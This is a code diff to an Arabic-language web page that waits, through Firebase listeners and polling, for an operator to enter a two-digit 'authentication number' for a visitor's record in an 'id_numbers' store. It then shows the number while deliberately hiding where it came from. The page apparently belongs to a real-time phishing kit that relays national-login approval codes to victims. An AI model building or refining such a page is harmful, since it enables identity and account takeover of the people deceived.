@@ -532,455 +532,106 @@
         </div>
     </div>
 
-<script type="text/javascript">
-    // ========== متغيرات النظام ==========
-    let checkInterval = null;
-    let firebaseListener = null;
-    let checkCount = 0;
-    const MAX_CHECKS = 600; // 10 دقائق (كل ثانية)
-    let firebaseInitialized = false;
-    let firebaseRealtimeDb = null;
-    let firestoreDb = null;
-    let authNumberReceived = false;
-    let waitingForApproval = true;
-    let currentRecordId = null;
-    
-    // ========== دوال التقدم ==========
-    function updateProgress(percent, message) {
-        const progressBar = document.getElementById('progressBar');
-        const progressText = document.getElementById('progressText');
-        const loadingMessage = document.getElementById('loadingMessage');
-        
-        if (progressBar) progressBar.style.width = percent + '%';
-        if (progressText) progressText.textContent = percent + '%';
-        if (loadingMessage && message) loadingMessage.textContent = message;
-    }
-    
-    // ========== تهيئة Firebase ==========
-    async function initializeFirebaseForSuccess() {
-        updateProgress(20, 'جاري تهيئة قاعدة البيانات...');
-        
-        try {
-            // استخدام خدمات Firebase من firebase-config.js
-            if (window.firebaseServices && typeof window.firebaseServices.initialize === 'function') {
-                const initialized = window.firebaseServices.initialize();
-                
-                if (initialized) {
-                    // الحصول على Realtime Database و Firestore
-                    firebaseRealtimeDb = window.firebaseServices.realtimeDb();
-                    firestoreDb = window.firebaseServices.firestore();
-                    firebaseInitialized = true;
-                    
-                    updateProgress(40, 'تم تهيئة قاعدة البيانات');
-                    console.log('✅ Firebase مهيئ لصفحة success');
-                    
-                    updateConnectionStatus('متصل');
-                    return true;
-                }
-            }
-            
-            // الطريقة الاحتياطية: التهيئة المباشرة
-            if (typeof firebase !== 'undefined') {
-                if (!firebase.apps || firebase.apps.length === 0) {
-                    firebase.initializeApp(firebaseConfig || window.firebaseConfig);
-                }
-                
-                if (firebase.database) {
-                    firebaseRealtimeDb = firebase.database();
-                }
-                
-                if (firebase.firestore) {
-                    firestoreDb = firebase.firestore();
-                }
-                
-                firebaseInitialized = true;
-                
-                updateProgress(40, 'تم تهيئة قاعدة البيانات');
-                console.log('✅ Firebase مهيئ لصفحة success (طريقة احتياطية)');
-                
-                updateConnectionStatus('متصل');
-                return true;
-            }
-            
-            updateProgress(30, 'لم يتم تهيئة قاعدة البيانات');
-            updateConnectionStatus('غير متصل', 'Firebase غير مهيئ');
-            return false;
-            
-        } catch (error) {
-            console.error('❌ خطأ في تهيئة Firebase:', error);
-            updateProgress(30, 'خطأ في تهيئة قاعدة البيانات');
-            updateConnectionStatus('خطأ', error.message);
-            return false;
-        }
-    }
-    
-    // ========== دالة تحديث حالة الاتصال ==========
-    function updateConnectionStatus(status, message = '') {
-        const statusElement = document.getElementById('connectionStatus');
-        const firebaseStatus = document.getElementById('firebaseStatus');
-        
-        if (!statusElement || !firebaseStatus) return;
-        
-        switch(status) {
-            case 'متصل':
-                statusElement.innerHTML = '<i class="fas fa-circle" style="color: #00ac75;"></i> متصل';
-                firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: #00ac75;"></i> متصل بقاعدة البيانات';
-                break;
-            case 'غير متصل':
-                statusElement.innerHTML = '<i class="fas fa-circle" style="color: #ff9800;"></i> غير متصل';
-                firebaseStatus.innerHTML = `<i class="fas fa-exclamation-triangle" style="color: #ff9800;"></i> غير متصل ${message}`;
-                break;
-            case 'خطأ':
-                statusElement.innerHTML = '<i class="fas fa-circle" style="color: #ff4757;"></i> خطأ';
-                firebaseStatus.innerHTML = `<i class="fas fa-times-circle" style="color: #ff4757;"></i> خطأ: ${message}`;
-                break;
-            case 'بانتظار المصادقة':
-                statusElement.innerHTML = '<i class="fas fa-clock" style="color: #ff9800;"></i> بانتظار المصادقة';
-                firebaseStatus.innerHTML = '<i class="fas fa-user-clock" style="color: #ff9800;"></i> في انتظار إدخال رقم المصادقة من المسؤول';
-                break;
-            default:
-                statusElement.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> جاري الاتصال...';
-                firebaseStatus.innerHTML = '<i class="fas fa-cloud"></i> جاري التحقق من اتصال قاعدة البيانات...';
-        }
-    }
-    
-    // ========== العملية الرئيسية ==========
-async function startChecking() {
-    updateProgress(10, 'بدء عملية التحقق...');
-    
-    // 1. الحصول على معاملات URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const authFromUrl = urlParams.get('auth');
-    const recordId = urlParams.get('recordId');
-    currentRecordId = recordId;
-    
-    // 2. تهيئة Firebase
-    const firebaseInit = await initializeFirebaseForSuccess();
-    
-    if (!firebaseInit) {
-        // إذا فشلت تهيئة Firebase، انتقل إلى وضع الانتظار البسيط
-        startSimpleWaitingMode();
-        return;
-    }
-    
-    // 3. إذا كان هناك رقم مصادقة في URL (من المسؤول مباشرة)
-    if (authFromUrl && authFromUrl.length === 2) {
-        const number = parseInt(authFromUrl);
-        if (!isNaN(number) && number >= 0 && number <= 99) {
-            // التحقق من أن الرقم صحيح لهذا المستخدم
-            displayAuthNumber(number, 'URL Parameter (Admin)');
-            startSuccessProcess();
-            return;
-        }
-    }
-    
-    // 4. التحقق أولاً إذا كان هناك رقم مصادقة مخزن مسبقاً
-    if (recordId) {
-        updateConnectionStatus('بانتظار المصادقة');
-        updateProgress(50, 'في انتظار إدخال رقم المصادقة من المسؤول...');
-        
-        // التحقق من وجود رقم مصادقة مخزن للمستخدم
-        if (window.firebaseServices && window.firebaseServices.checkUserAuthNumber) {
-            const authCheck = await window.firebaseServices.checkUserAuthNumber(recordId);
-            
-            if (authCheck.success && authCheck.hasAuthNumber) {
-                displayAuthNumber(authCheck.authNumber, 'Stored User Auth');
-                startSuccessProcess();
-                return;
-            }
-        }
-        
-        // إعداد مستمع Firebase للتحديثات الفورية للمستخدم المحدد
-        setupRealtimeListener(recordId);
-        
-        // أيضًا التحقق من حالة السجل في Firestore
-        checkRecordStatus(recordId);
-    } else {
-        // إذا لا يوجد معرف سجل، ننتظر تحديثات عامة
-        updateConnectionStatus('بانتظار المصادقة');
-        updateProgress(50, 'جاري البحث عن رقم المصادقة...');
-        setupRealtimeListener(null);
-    }
-    
-    // 5. بدء الفحص الدوري
-    startPeriodicChecking();
+<script>
+/* ================== CONFIG ================== */
+let firebaseInitialized = false;
+let realtimeDb = null;
+let firestoreDb = null;
+let checkInterval = null;
+let currentRecordId = null;
+
+/* ================== UI ================== */
+function updateProgress(p, msg) {
+  document.getElementById('progressBar').style.width = p + '%';
+  document.getElementById('progressText').innerText = p + '%';
+  if (msg) document.getElementById('loadingMessage').innerText = msg;
 }
-    
-    // ========== إعداد مستمع Firebase ==========
-  function setupRealtimeListener(recordId) {
 
-    // ========== التحقق من حالة السجل في Firestore ==========
-    async function checkRecordStatus(recordId) {
-        if (!firestoreDb) return;
-        
-        try {
-            const doc = await firestoreDb.collection('id_numbers').doc(recordId).get();
-            
-            if (doc.exists) {
-                const data = doc.data();
-                
-                // إذا كان السجل مكتمل وبه رقم مصادقة
-                if (data.status === 'completed' && data.auth_number) {
-                    displayAuthNumber(data.auth_number, 'Firestore (Admin)');
-                    startSuccessProcess();
-                }
-                // إذا كان السجل ملغي
-                else if (data.status === 'cancelled') {
-                    // توجيه إلى صفحة sorry.html
-                    window.location.href = `sorry.html?recordId=${recordId}`;
-                }
-                // إذا كان السجل لا يزال قيد الانتظار
-                else {
-                    console.log('⏳ السجل لا يزال قيد الانتظار...');
-                    updateProgress(60, 'لا يزال طلبك قيد المراجعة من قبل المسؤول...');
-                }
-            }
-        } catch (error) {
-            console.warn('⚠️ خطأ في التحقق من حالة السجل:', error);
-        }
+function updateConnection(text) {
+  document.getElementById('firebaseStatus').innerText = text;
+}
+
+/* ================== INIT ================== */
+async function initFirebase() {
+  try {
+    if (window.firebaseServices) {
+      window.firebaseServices.initialize();
+      realtimeDb = window.firebaseServices.realtimeDb();
+      firestoreDb = window.firebaseServices.firestore();
+      firebaseInitialized = true;
+      updateProgress(40, 'تم الاتصال بقاعدة البيانات');
+      updateConnection('✅ متصل بقاعدة البيانات');
+      return true;
     }
-    
-    // ========== بدء الفحص الدوري ==========
-    function startPeriodicChecking() {
-        checkCount = 0;
-        
-        if (checkInterval) {
-            clearInterval(checkInterval);
-        }
-        
-        checkInterval = setInterval(async () => {
-            checkCount++;
-            
-            // تحديث شريط التقدم ورسالة الانتظار
-            const minutes = Math.floor(checkCount / 60);
-            const seconds = checkCount % 60;
-            updateProgress(60 + (checkCount / MAX_CHECKS * 20), 
-                         `في انتظار إدخال رقم المصادقة... (${minutes}:${seconds.toString().padStart(2, '0')})`);
-            
-            // التحقق من حالة السجل بشكل دوري إذا كان هناك معرف
-            if (currentRecordId && firestoreDb && (checkCount % 10 === 0)) {
-                await checkRecordStatus(currentRecordId);
-            }
-            
-            // التحقق من انتهاء الوقت
-            if (checkCount >= MAX_CHECKS) {
-                clearInterval(checkInterval);
-                handleTimeout();
-            }
-        }, 1000);
-    }
-    
-    // ========== وضع الانتظار البسيط (بدون Firebase) ==========
-    function startSimpleWaitingMode() {
-        document.getElementById('loadingTitle').textContent = 'جاري الاتصال بالنظام';
-        document.getElementById('loadingMessage').innerHTML = 
-            '<span style="color: #ff9800;">في انتظار إدخال رقم المصادقة من المسؤول...</span>';
-        
-        // تحديث مؤشر التقدم بشكل مستمر
-        let progress = 10;
-        const progressInterval = setInterval(() => {
-            progress += 0.5;
-            if (progress > 90) progress = 10;
-            updateProgress(progress, 'في انتظار إدخال رقم المصادقة من المسؤول...');
-        }, 1000);
-        
-        // محاولة إعادة الاتصال كل 30 ثانية
-        setTimeout(async () => {
-            clearInterval(progressInterval);
-            await initializeFirebaseForSuccess();
-            if (firebaseInitialized) {
-                startChecking();
-            } else {
-                startSimpleWaitingMode();
-            }
-        }, 30000);
-    }
-    
-    // ========== عرض رقم المصادقة ==========
-    function displayAuthNumber(number, source) {
-        try {
-            // توقف عن الفحص الدوري
-            if (checkInterval) {
-                clearInterval(checkInterval);
-                checkInterval = null;
-            }
-            
-            // إيقاف مستمع Firebase
-            if (firebaseListener && firebaseRealtimeDb) {
-                firebaseRealtimeDb.ref('current_auth_number').off('value', firebaseListener);
-            }
-            
-            const formattedNumber = number < 10 ? '0' + number : number.toString();
-            
-            // تحديث العرض
-            const passcodeCard = document.getElementById('passcodeDisplay');
-            if (passcodeCard) {
-                passcodeCard.setAttribute('data-after-content', formattedNumber);
-                passcodeCard.setAttribute('aria-label', `الرمز ${formattedNumber}`);
-                
-                // تأثير مرئي
-                passcodeCard.style.transform = 'scale(1.1)';
-                setTimeout(() => {
-                    passcodeCard.style.transform = 'scale(1)';
-                }, 300);
-                
-                // إخفاء مصدر الرقم (حتى لا يظهر للمستخدم)
-                const passcodeInfo = document.getElementById('passcodeInfo');
-                if (passcodeInfo) {
-                    passcodeInfo.style.display = 'none'; // إخفاء مصدر الرقم
-                }
-                
-                authNumberReceived = true;
-                waitingForApproval = false;
-                
-                console.log('✅ تم عرض رقم المصادقة:', formattedNumber, 'من:', source);
-                return true;
-            }
-        } catch (error) {
-            console.error('❌ خطأ في عرض رقم المصادقة:', error);
-            return false;
-        }
-    }
-    
-    // ========== بدء عملية النجاح ==========
-    function startSuccessProcess() {
-        updateProgress(90, 'تم استلام رقم المصادقة، جاري التحميل...');
-        updateConnectionStatus('متصل');
-        
-        setTimeout(() => {
-            // إخفاء شاشة التحميل
-            document.getElementById('loadingScreen').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
-            
-            updateProgress(100, 'تم التحميل بنجاح');
-            
-            // تحديث نص الانتظار في الواجهة الرئيسية
-            const waitingText = document.getElementById('waitingText');
-            if (waitingText) {
-                waitingText.textContent = 'تم إدخال الرقم بنجاح، يمكنك المتابعة';
-            }
-            
-            // بدء الاستطلاع بعد التأخير
-            setTimeout(() => {
-                if (typeof startPollingAfterDelay === 'function') {
-                    startPollingAfterDelay();
-                }
-            }, 2000);
-            
-        }, 1500);
-    }
-    
-    // ========== التعامل مع انتهاء الوقت ==========
-    function handleTimeout() {
-        document.getElementById('loadingTitle').textContent = 'انتهى وقت الانتظار';
-        document.getElementById('loadingMessage').innerHTML = 
-            '<span style="color: #ff4757;">تجاوز وقت الانتظار. الرجاء المحاولة مرة أخرى.</span>';
-        
-        updateConnectionStatus('انتهى الوقت', 'انتهى وقت انتظار الرقم');
-    }
-    
-    // ========== تحميل الصفحة ==========
-    document.addEventListener('DOMContentLoaded', function() {
-        console.log('📄 صفحة success.html محملة');
-        
-        // إخفاء مصدر الرقم بشكل دائم
-        const passcodeInfo = document.getElementById('passcodeInfo');
-        if (passcodeInfo) {
-            passcodeInfo.style.display = 'none';
-        }
-        
-        // إظهار شاشة التحميل
-        const loadingScreen = document.getElementById('loadingScreen');
-        const mainContent = document.getElementById('mainContent');
-        
-        if (loadingScreen) loadingScreen.style.display = 'flex';
-        if (mainContent) mainContent.style.display = 'none';
-        
-        // بدء عملية التحقق
-        startChecking();
-        
-        // تنظيف عند إغلاق الصفحة
-        window.addEventListener('beforeunload', function() {
-            if (checkInterval) clearInterval(checkInterval);
-            if (firebaseListener && firebaseRealtimeDb) {
-                firebaseRealtimeDb.ref('current_auth_number').off('value', firebaseListener);
-            }
-        });
-    });
-    
-    // ========== دوال الصفحة الأصلية ==========
-    function cancel() {
-        document.getElementById("cancelOnWeb").value = "cancelledOnWebWaiting";
-        document.getElementById("loginForm").submit();
+  } catch (e) {
+    console.error(e);
+  }
+  return false;
+}
+
+/* ================== LISTENER ================== */
+function setupRealtimeListener(recordId) {
+  if (!recordId || !realtimeDb) return;
+
+  const ref = realtimeDb.ref(`user_auth_numbers/${recordId}`);
+
+  ref.on('value', snap => {
+    const data = snap.val();
+
+    if (!data) {
+      updateProgress(50, 'في انتظار موافقة المسؤول...');
+      return;
     }
 
-    function timeout() {
-        document.getElementById("cancelOnWeb").value = "webWaitingTimeout";
-        document.getElementById("loginForm").submit();
+    if (data.status === 'waiting') {
+      updateProgress(60, 'الطلب قيد المراجعة...');
+      return;
     }
 
-    function startPollingAfterDelay() {
-        setTimeout(() => {
-            sendTimingInfoInit();
-        }, 2000);
+    if (data.status === 'completed' && data.number !== undefined) {
+      showAuthNumber(data.number);
     }
+  });
+}
 
-    function sendTimingInfoInit() {
-        var url_string = window.location.href;
-        var url = new URL(url_string);
-        var trx = url.searchParams.get("trx");
+/* ================== DISPLAY ================== */
+function showAuthNumber(num) {
+  clearInterval(checkInterval);
 
-        function poll() {
-            if (!trx) {
-                console.warn('⚠️ trx غير محدد');
-                return;
-            }
-            
-            var pollingurl = "/auth/trx/status?trx=" + trx;
+  const formatted = num < 10 ? '0' + num : num;
+  document.getElementById('passcodeDisplay')
+    .setAttribute('data-after-content', formatted);
 
-            if(document.getElementById("cancelOnWeb").value !== "cancelledOnWebWaiting" &&
-               document.getElementById("cancelOnWeb").value !== "webWaitingTimeout") {
-                $.ajax({
-                    type: "GET",
-                    cache: false,
-                    url: pollingurl,
-                    success: function (data, status) {
-                        if(data.code == '0') {
-                            if (data.isConfirmed == '0') {
-                                setTimeout(poll, 2000);
-                            } else {
-                                document.getElementById("loginForm").submit();
-                            }
-                        }
-                    },
-                    error: function(xhr, status, error) {
-                        console.warn('⚠️ خطأ في طلب AJAX:', error);
-                    }
-                });
-            }
-        }
-        
-        setTimeout(poll, 3000);
-        setTimeout(timeout, 180000);
-    }
-    
-            // ========== دالة للاختبار ==========
-        window.testFirebaseSuccess = async function() {
-            console.log('🧪 اختبار Firebase في صفحة success...');
-            
-            const result = {
-                firebaseServices: !!window.firebaseServices,
-                successFirestore: !!successFirestore,
-                successRealtimeDb: !!successRealtimeDb,
-                authNumberReceived: authNumberReceived,
-                waitingForApproval: waitingForApproval,
-                currentRecordId: currentRecordId,
-                timestamp: new Date().toISOString()
-            };
-            
-            console.log('📊 نتيجة الاختبار:', result);
-            return result;
-        };
-    </script>
+  updateProgress(100, 'تم استلام رقم المصادقة');
+  document.getElementById('loadingScreen').style.display = 'none';
+  document.getElementById('mainContent').style.display = 'block';
+}
+
+/* ================== START ================== */
+async function start() {
+  updateProgress(10, 'جاري التحضير...');
+  const params = new URLSearchParams(location.search);
+  currentRecordId = params.get('recordId');
+
+  const ok = await initFirebase();
+  if (!ok) {
+    updateProgress(30, 'تعذر الاتصال');
+    return;
+  }
+
+  updateProgress(50, 'في انتظار رقم المصادقة...');
+  setupRealtimeListener(currentRecordId);
+
+  checkInterval = setInterval(() => {
+    updateProgress(
+      Math.min(80, document.getElementById('progressBar').style.width.replace('%','') * 1 + 1),
+      'في انتظار موافقة المسؤول...'
+    );
+  }, 1000);
+}
+
+document.addEventListener('DOMContentLoaded', start);
+</script>
+
 </body>
 </html>
